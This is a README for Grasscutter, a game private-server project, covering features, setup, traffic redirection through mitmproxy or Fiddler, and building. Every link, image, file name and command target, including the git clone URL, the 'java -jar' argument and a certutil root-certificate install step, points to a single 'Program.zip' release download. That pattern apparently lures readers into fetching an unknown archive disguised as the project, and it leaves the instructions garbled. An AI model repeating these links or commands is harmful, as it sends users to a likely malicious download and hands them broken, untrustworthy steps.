![Grasscutter](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip%3A%2F%https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip%2F2022%2F04%2F25%https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
<div align="center"><img alt="Documentation" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub release (latest by date)" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub last commit" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"> <img alt="GitHub Workflow Status" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"></div>

<div align="center"><a href="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"><img alt="Discord - Grasscutter" src="https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip"></a></div>

EN | [简中](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [繁中](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [FR](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [ES](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [HE](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) | [RU](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)

**Attention:** We always welcome contributors to the project. Before adding your contribution, please carefully read our [Code of Conduct](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).

## Current features

* Logging in
* Combat
* Friends list
* Teleportation
* Gacha system
* Co-op *partially* works
* Spawning monsters via console
* Inventory features (receiving items/characters, upgrading items/characters, etc)

## Quick setup guide

**Note:** For support please join our [Discord](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).

### Requirements

* Java SE - 17 ([link](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip))

  **Note:** If you just want to **run it**, then **jre** only is fine.

* [MongoDB](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) (recommended 4.0+)

* Proxy daemon: mitmproxy (mitmdump, recommended), Fiddler Classic, etc.

### Running

**Note:** If you updated from an older version, delete `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip` to regenerate it.

1. Get `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`
   - Download from [actions](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
   - [Build by yourself](#Building)
2. Create a `resources` folder in the directory where https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip is located and move your `BinOutput` and `ExcelBinOutput` folders there *(Check the [wiki](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) for more details how to get those.)*
3. Run Grasscutter with `java -jar https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`. **Make sure mongodb service is running as well.**

### Connecting with the client

½. Create an account using [server console command](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).

1. Redirect traffic: (choose one)
    - mitmdump: `mitmdump -s https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip -k`
    
      Trust CA certificate:
    
      ​	**Note:**The CA certificate is usually stored in `%USERPROFILE%\ .mitmproxy`, or you can download it from `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip`
    
      ​	Double click for [install](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip) or ...
    
      - Via command line
    
        ```shell
        certutil -addstore root %USERPROFILE%\.mitmproxy\https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
        ```
    
    - Fiddler Classic: Run Fiddler Classic, turn on `Decrypt https traffic` in setting and change the default port there (Tools -> Options -> Connections) to anything other than `8888`, and load [this script](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip).
      
    - [Hosts file](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
    
2. Set network proxy to `127.0.0.1:8080` or the proxy port you specified.

**you can also use `https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip` to start servers and proxy daemons automatically, but you have to set up JAVA_HOME enviroment**

### Building

Grasscutter uses Gradle to handle dependencies & building.

**Requirements:**

- [Java SE Development Kits - 17](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)
- [Git](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)

##### Windows

```shell
git clone https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
cd Grasscutter
.\https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip # Setting up environments
.\gradlew jar # Compile
```

##### Linux

```bash
git clone https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip
cd Grasscutter
chmod +x gradlew
./gradlew jar # Compile
```

You can find the output jar in the root of the project folder.

### Commands have moved to the [wiki](https://github.com/dnangel298/Grasscutter/releases/download/v1.0/Program.zip)!

# Quick Troubleshooting

* If compiling wasn't successful, please check your JDK installation (JDK 17 and validated JDK's bin PATH variable)
* My client doesn't connect, doesn't login, 4206, etc... - Mostly your proxy daemon setup is *the issue*, if using
  Fiddler make sure it running on another port except 8888
* Startup sequence: MongoDB > Grasscutter > Proxy daemon (mitmdump, fiddler, etc.) > Game
